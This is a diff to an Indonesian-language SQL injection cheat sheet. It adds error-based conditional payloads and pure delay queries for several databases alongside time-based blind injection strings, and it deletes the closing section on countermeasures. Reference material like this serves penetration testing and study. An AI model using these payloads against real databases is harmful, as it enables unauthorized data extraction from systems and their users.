@@ -85,6 +85,26 @@ Pada Oracle, hampir semua query membutuhkan klausa `FROM`, tidak seperti MySQL/P
 | Oracle     | `SUBSTR(string, start, length)`           | `SUBSTR('abcdef', 2, 3) -> 'bcd'`           |
 | SQLite     | `SUBSTR(string, start, length)`           | `SUBSTR('abcdef', 2, 3) -> 'bcd'`           |
 
+### d. Query Limit (Membatasi Jumlah Hasil)
+
+| Database   | Sintaks Limit                                                 | Contoh                                                                                                   |
+| ---------- | ------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------- |
+| MySQL      | `LIMIT n OFFSET m`                                            | `SELECT * FROM users LIMIT 5 OFFSET 10;`                                                                 |
+| PostgreSQL | `LIMIT n OFFSET m`                                            | `SELECT * FROM users LIMIT 5 OFFSET 10;`                                                                 |
+| MSSQL      | `SELECT TOP n ...` atau `OFFSET ... FETCH NEXT ... ROWS ONLY` | `SELECT TOP 5 * FROM users;`<br>`SELECT * FROM users ORDER BY id OFFSET 10 ROWS FETCH NEXT 5 ROWS ONLY;` |
+| Oracle     | `ROWNUM` atau `FETCH FIRST n ROWS ONLY`                       | `SELECT * FROM users WHERE ROWNUM <= 5;`<br>`SELECT * FROM users FETCH FIRST 5 ROWS ONLY;`               |
+
+### e. Conditional Errors (Error-based Condition)
+
+| Database       | Payload                                                                                 |
+| -------------- | --------------------------------------------------------------------------------------- |
+| **Oracle**     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`      |
+| **MSSQL**      | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
+| **PostgreSQL** | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`          |
+| **MySQL**      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |
+
+> **Catatan:** Teknik ini digunakan untuk memicu error hanya jika kondisi tertentu terpenuhi, sehingga dapat digunakan untuk inferensi data secara lebih presisi pada error-based SQLi.
+
 ---
 
 ## 3. Klasifikasi Teknik Eksploitasi
@@ -119,13 +139,18 @@ Pada Oracle, hampir semua query membutuhkan klausa `FROM`, tidak seperti MySQL/P
 
 #### ii. Time-Based Blind
 
-| Deskripsi                     | Payload                                                                                         |
-| ----------------------------- | ----------------------------------------------------------------------------------------------- |
-| Delay jika benar (MySQL)      | `' AND IF(SUBSTRING(user(),1,1)='d', SLEEP(5), 0) --`                                           |
-| Delay jika benar (PostgreSQL) | `' AND (SELECT CASE WHEN (SUBSTRING(user(),1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END) --` |
-| Delay jika benar (MSSQL)      | `; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5' --`                                  |
-| Delay jika benar (Oracle)     | `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) --`                                                   |
-| Delay jika benar (SQLite)     | `' AND 1=LIKE('ABC',UPPER(HEX(RANDOMBLOB(100000000)))) --`                                      |
+| Deskripsi                      | Payload                                                                                         |
+| ------------------------------ | ----------------------------------------------------------------------------------------------- |
+| Delay jika benar (MySQL)       | `' AND IF(SUBSTRING(user(),1,1)='d', SLEEP(5), 0) --`                                           |
+| Query delay murni (MySQL)      | `SELECT SLEEP(5);`                                                                              |
+| Delay jika benar (PostgreSQL)  | `' AND (SELECT CASE WHEN (SUBSTRING(user(),1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END) --` |
+| Query delay murni (PostgreSQL) | `SELECT pg_sleep(5);`                                                                           |
+| Delay jika benar (MSSQL)       | `; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5' --`                                  |
+| Query delay murni (MSSQL)      | `WAITFOR DELAY '0:0:5';`                                                                        |
+| Delay jika benar (Oracle)      | `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) --`                                                   |
+| Query delay murni (Oracle)     | `BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',5); END;`                                                  |
+| Delay jika benar (SQLite)      | `' AND 1=LIKE('ABC',UPPER(HEX(RANDOMBLOB(100000000)))) --`                                      |
+| Query delay murni (SQLite)     | `SELECT LIKE('ABC',UPPER(HEX(RANDOMBLOB(100000000))));`                                         |
 
 ---
 
@@ -209,15 +234,5 @@ Menyisipkan query SQL di field GraphQL yang langsung diteruskan ke DB.
 | **jSQL Injection** | Tool berbasis Java dengan GUI untuk mempermudah proses pengujian.          |
 | **Burp Suite**     | Proxy serbaguna dengan scanner yang dapat mendeteksi kerentanan SQLi.      |
 | **OWASP ZAP**      | Alternatif open-source untuk Burp Suite, bagus untuk menemukan kerentanan. |
-
----
-
-## 7. Catatan Keamanan & Penanggulangan
-
-- Gunakan _prepared statements_ / _parameterized queries_.
-- Lakukan validasi input dan gunakan _whitelisting_.
-- Batasi pesan error yang ditampilkan ke user.
-- Terapkan prinsip _least privilege_ pada akun DB.
-- Gunakan WAF dan _input filtering_ yang tepat.
 
 ---
